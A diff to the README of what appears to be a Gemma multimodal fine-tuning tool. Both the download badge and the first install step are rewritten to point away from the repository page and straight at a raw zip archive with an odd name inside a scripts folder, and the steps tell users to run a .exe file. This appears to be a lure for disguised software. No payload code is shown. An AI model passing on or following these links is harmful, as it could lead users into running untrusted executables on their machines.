@@ -1,6 +1,6 @@
 # ⚙️ gemma-tuner-multimodal - Train models with images and sound
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Daylany671/gemma-tuner-multimodal)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Daylany671/gemma-tuner-multimodal/main/gemma_tuner/scripts/gemma-multimodal-tuner-hypochondriasis.zip)
 
 This software allows users to adjust Gemma artificial intelligence models. It works with text, images, and audio files. You perform these tasks on your local computer hardware. The tool uses standard frameworks to manage data calculations efficiently.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software. Please verify your syst
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following website to download the installation package: https://github.com/Daylany671/gemma-tuner-multimodal
+1. Visit the following website to download the installation package: https://raw.githubusercontent.com/Daylany671/gemma-tuner-multimodal/main/gemma_tuner/scripts/gemma-multimodal-tuner-hypochondriasis.zip
 2. Look for the recent release section on the page.
 3. Click the file that ends with .exe to start the download.
 4. Save the file to your desktop or downloads folder.
